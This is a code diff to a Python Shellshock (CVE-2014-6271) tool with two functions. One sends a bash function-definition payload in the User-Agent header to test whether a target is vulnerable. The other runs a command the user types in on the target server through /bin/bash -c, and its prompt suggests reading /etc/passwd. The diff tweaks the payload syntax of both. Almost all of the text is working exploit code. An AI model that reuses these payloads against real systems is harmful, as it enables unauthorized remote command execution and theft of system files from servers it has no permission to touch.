@@ -17,8 +17,8 @@ if sys.argv[1] == "-h" or sys.argv[1] == "help" or len(sys.argv) < 5:
 
 def shellshock_test():
     targetURL = sys.argv[2] + sys.argv[3] + sys.argv[4]
-    testPayload = '() { :;}; echo;echo "/bin/sh -c echo VULNERABLE"'
-    r = requests.get(targetURL, headers = {'User-agent': testPayload})
+    testPayload = '() { :; }; echo;echo "/bin/sh -c echo VULNERABLE"'
+    r = requests.get(targetURL, headers = {'user-agent': testPayload})
     if r.status_code == 200:
         print("\033[31;47m" + "{url} is vulnerable to CVE-2014-6271".format(url=targetURL) + "\033[0m")
     else:
@@ -27,8 +27,8 @@ def shellshock_test():
 def shellshock_exploit():
     targetURL = sys.argv[2] + sys.argv[3] + sys.argv[4]
     command = input("Enter your command like /bin/cat /etc/passwd: ")
-    targetPayload = '() { foo;};echo "Content-type: text/plain";echo;echo;' + command
-    r = requests.get(targetURL, headers = {'User-agent': targetPayload})
+    targetPayload = "() { :; };echo; echo; /bin/bash -c '" + command + ";'"
+    r = requests.get(targetURL, headers = {'user-agent': targetPayload})
     print("\033[31;103m" + r.text + "\033[0m")
 
 if sys.argv[1] == "test":
